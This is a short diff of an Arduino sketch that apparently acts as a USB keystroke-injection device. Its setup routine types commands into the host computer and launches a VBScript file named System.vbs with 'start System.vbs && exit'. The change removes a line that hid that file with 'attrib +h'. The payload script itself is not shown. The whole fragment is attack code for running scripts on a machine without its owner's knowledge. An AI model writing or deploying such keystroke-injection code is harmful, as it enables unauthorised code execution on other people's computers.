@@ -124,9 +124,6 @@ void setup()
   Keyboard.print(F("\""));
   typeKey(KEY_RETURN); 
   delay(80);
-  Keyboard.print("attrib +h System.vbs");
-  typeKey(KEY_RETURN); 
-  delay(80);
   Keyboard.print("start System.vbs && exit");
   typeKey(KEY_RETURN);
   delay(50);
